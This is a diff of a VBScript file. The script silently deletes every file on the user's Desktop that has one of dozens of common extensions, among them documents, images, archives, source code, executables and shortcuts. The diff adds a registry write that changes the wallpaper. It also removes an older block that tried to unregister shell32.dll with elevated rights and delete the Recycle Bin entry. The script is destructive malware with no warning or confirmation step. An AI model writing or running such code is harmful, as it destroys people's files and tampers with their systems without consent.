@@ -1,31 +1,29 @@
 Option Explicit
 
-Dim objFSO, objFolder, objFile, objShell, i
+Dim objShell, objFSO, objFolder, objFile, extension
+
+' Create a Shell object
+Set objShell = CreateObject("WScript.Shell")
+
+' Set the wallpaper
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 
 ' Create a FileSystemObject
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Get the Desktop folder
-Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))
+Set objFolder = objFSO.GetFolder(objShell.SpecialFolders("Desktop"))
 
-' Loop through each file in the Desktop folder and delete if it has current file extension prompt
+' Loop through each file in the Desktop folder and delete if it has a specific file extension
 For Each objFile In objFolder.Files
-    Dim extension
     extension = LCase(objFSO.GetExtensionName(objFile.Name))
     If extension = "txt" Or extension = "exe" Or extension = "json" Or extension = "doc" Or extension = "pdf" Or extension = "wpd" Or extension = "docx" Or extension = "rtf" Or extension = "tex" Or extension = "odt" Or extension = "jpg" Or extension = "jpeg" Or extension = "mp3" Or extension = "rar" Or extension = "vcd" Or extension = "webp" Or extension = "css" Or extension = "html" Or extension = "py" Or extension = "php" Or extension = "ico" Or extension = "lnk" Or extension = "mp4" Or extension = "js" Or extension = "bak" Or extension = "xml" Or extension = "zip" Then
         objFSO.DeleteFile(objFile)
     End If
 Next
 
-' Remove Recycle Bin from Desktop
-Set objShell = CreateObject("Shell.Application")
-objShell.ShellExecute "regsvr32 /u /n /i:U shell32.dll", "", "", "runas", 1
-objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{645FF040-5081-101B-9F08-00AA002F954E}"
-
 ' Release FileSystemObject resources
 Set objFile = Nothing
 Set objFolder = Nothing
 Set objFSO = Nothing
-
-' Release Shell object resources
-Set objShell = Nothing
